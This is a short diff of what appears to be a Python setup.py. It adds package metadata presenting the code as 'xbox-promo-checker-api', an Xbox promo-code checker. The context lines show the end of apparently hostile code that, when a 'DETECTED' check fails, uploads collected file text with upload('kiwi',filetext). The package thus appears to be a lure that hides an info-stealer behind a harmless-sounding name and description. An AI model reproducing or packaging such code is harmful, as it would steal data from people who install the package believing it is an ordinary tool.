@@ -678,4 +678,16 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                
+setup(
+
+    name='xbox-promo-checker-api',
+    packages=['xbox-promo-checker-api'],
+    version='1.0',
+    license='MIT',
+    description='checks xbox promo codes without proxies (non ratelimited)',
+    author='bluesatan',
+    keywords=['style'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+
+)
